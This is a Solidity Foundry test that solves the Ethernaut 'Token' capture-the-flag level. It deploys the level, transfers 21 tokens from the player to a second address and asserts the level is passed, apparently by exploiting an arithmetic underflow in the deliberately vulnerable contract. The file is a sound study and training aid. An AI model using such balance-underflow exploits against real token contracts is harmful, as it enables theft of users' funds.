pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";

// contracts
import "../src/Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract TokenTest is Test {
    address alice = address(0x1337);
    address bob = address(0x69);

    Ethernaut ethernaut;
    Token ethernautToken;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(address(this), "TokenTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        ethernautToken = Token(payable(levelAddress));

        vm.label(address(ethernautToken), "EthernautToken");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {
        ethernautToken.transfer(bob, 21);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(address(ethernautToken)));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }

}